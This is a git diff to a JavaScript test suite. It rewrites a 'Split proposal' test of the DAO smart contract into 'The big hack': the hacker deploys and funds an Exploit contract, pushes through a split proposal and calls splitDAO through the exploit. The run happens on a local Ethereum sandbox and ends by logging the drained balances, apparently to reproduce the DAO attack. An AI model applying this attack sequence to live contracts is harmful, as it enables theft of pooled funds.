@@ -3,7 +3,7 @@ var async = require('async');
 var Sandbox = require('ethereum-sandbox-client');
 var helper = require('ethereum-sandbox-helper');
 
-describe('Split proposal', function() {
+describe('The big hack', function() {
   this.timeout(60000);
   
   var curator = '0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826';
@@ -17,17 +17,20 @@ describe('Split proposal', function() {
       amount: 40
     }
   ];
-  var recipient = '0xdedb49385ad5b94a16f236a6890cf9e0b1e30392';
+  var hacker = '0xdedb49385ad5b94a16f236a6890cf9e0b1e30392';
   var sandbox = new Sandbox('http://localhost:8555');
   var compiled = helper.compile('.', ['DAO.sol']);
-  var creator, dao, proposalId;
+  var creator, dao, exploit, proposalId;
   
   before(function(done) {
     async.series([
       sandbox.start.bind(sandbox, __dirname + '/ethereum.json'),
       deployCreator,
       deployDAO,
-      fuel,
+      deployExploit,
+      participantsFuel,
+      hackerFuel,
+      exploitFuel,
       waitForClosing
     ], done);
     
@@ -67,7 +70,29 @@ describe('Split proposal', function() {
         }
       );
     }
-    function fuel(cb) {
+    function deployExploit(cb) {
+      var compiled = helper.compile(__dirname, ['exploit.sol']);
+      if (compiled.errors) return done(compiled.errors);
+      
+      sandbox.web3.eth.contract(JSON.parse(compiled.contracts['Exploit'].interface)).new(
+        dao.address,
+        dao.rewardAccount(),
+        hacker,
+        {
+          from: hacker,
+          value: sandbox.web3.toWei(3, 'ether'),
+          data: '0x' + compiled.contracts['Exploit'].bytecode
+        },
+        function(err, contract) {
+    	    if (err) cb(err);
+    	    else if (contract.address) {
+    	      exploit = contract;
+    	      cb();
+    	    }
+        }
+      );
+    }
+    function participantsFuel(cb) {
       async.each(
         participants,
         function(participant, cb) {
@@ -84,6 +109,29 @@ describe('Split proposal', function() {
         cb
       );
     }
+    function hackerFuel(cb) {
+      sandbox.web3.eth.sendTransaction({
+        from: hacker,
+        to: dao.address,
+        gas: 200000,
+        value: sandbox.web3.toWei(1, 'ether')
+      }, function(err, txHash) {
+        if (err) cb(err);
+        else helper.waitForReceipt(sandbox.web3, txHash, cb);
+      });
+    }
+    function exploitFuel(cb) {
+      exploit.fuel({
+        from: hacker,
+        gas: 1000000
+      }, function(err, txHash) {
+        if (err) cb(err);
+        else helper.waitForReceipt(sandbox.web3, txHash, function(err, receipt) {
+          if (err) return cb(err);
+          cb();
+        });
+      });
+    }
     function waitForClosing(cb) {
       var check = setInterval(function() {
         if (dao.closingTime().lt(Math.floor(Date.now() / 1000))) {
@@ -93,17 +141,17 @@ describe('Split proposal', function() {
       }, 2000);
     }
   });
-  
+
   it('Create a split proposal', function(done) {
     dao.newProposal(
-      recipient,
+      hacker,
       0,
-      'Proposal#1',
+      'lonely, so lonely',
       '',
       5,
       true,
       {
-        from: participants[0].address,
+        from: hacker,
         gas: 1000000
       },
       function(err, txHash) {
@@ -119,44 +167,64 @@ describe('Split proposal', function() {
   });
   
   it('Vote for the proposal', function(done) {
-    async.each(
-      participants,
-      function(participant, cb) {
-        dao.vote(proposalId, true, { from: participant.address }, function(err, txHash) {
-          if (err) cb(err);
-          else helper.waitForReceipt(sandbox.web3, txHash, cb);
-        });
-      },
-      function(err) {
-        if (err) done(err);
-        else waitForDebatingPeriodFinish(done);
-        
-        function waitForDebatingPeriodFinish(cb) {
-          var check = setInterval(function() {
-            if (dao.proposals(proposalId)[3].lt(Math.floor(Date.now() / 1000))) {
-              clearInterval(check);
-              cb();
-            }
-          }, 2000);
+    async.parallel([
+      participantsVote,
+      hackerVote,
+      exploitVote,
+      waitForDebatingPeriodFinish
+    ], done);
+    
+    function participantsVote(cb) {
+      async.each(
+        participants,
+        function(participant, cb) {
+          dao.vote(proposalId, false, { from: participant.address }, function(err, txHash) {
+            if (err) cb(err);
+            else helper.waitForReceipt(sandbox.web3, txHash, cb);
+          });
+        },
+        cb
+      );
+    }
+    function hackerVote(cb) {
+      dao.vote(proposalId, true, { from: hacker }, function(err, txHash) {
+        if (err) cb(err);
+        else helper.waitForReceipt(sandbox.web3, txHash, cb);
+      });
+    }
+    function exploitVote(cb) {
+      exploit.vote(proposalId, { from: hacker }, function(err, txHash) {
+        if (err) cb(err);
+        else helper.waitForReceipt(sandbox.web3, txHash, cb);
+      });
+    }
+    function waitForDebatingPeriodFinish(cb) {
+      var check = setInterval(function() {
+        if (dao.proposals(proposalId)[3].lt(Math.floor(Date.now() / 1000))) {
+          clearInterval(check);
+          cb();
         }
-      }
-    );
+      }, 2000);
+    }
   });
   
-  it('Split the DAO', function(done) {
-    dao.splitDAO(proposalId, recipient, {
-      from: participants[0].address
+  it('Hack the DAO', function(done) {
+    exploit.splitDAO(proposalId, {
+      from: hacker
     }, function(err, txHash) {
       if (err) done(err);
       else helper.waitForReceipt(sandbox.web3, txHash, function(err, receipt) {
         if (err) return done(err);
+
+        receipt.logs.forEach(function(log) {
+          if (log.address == exploit.address)
+            console.log(helper.hexToString(log.data));
+        });
         
-        assert(dao.proposals(proposalId)[5], 'The proposal has not passed');
-        
-        var abi = JSON.parse(compiled.contracts['DAO'].interface);
-        var newDao = sandbox.web3.eth.contract(abi).at(dao.getNewDAOAddress(proposalId));
-        assert.equal(newDao.curator(), recipient, 'The new DAO has a wrong curator');
-        
+        console.log('the dao balance: ' + sandbox.web3.eth.getBalance(dao.address).toString());
+        console.log('the reward account balance: ' + sandbox.web3.eth.getBalance(dao.rewardAccount()).toString());
+        console.log('the dark dao balance: ' + sandbox.web3.eth.getBalance(dao.getNewDAOAddress(proposalId)).toString());
+
         done();
       });
     });
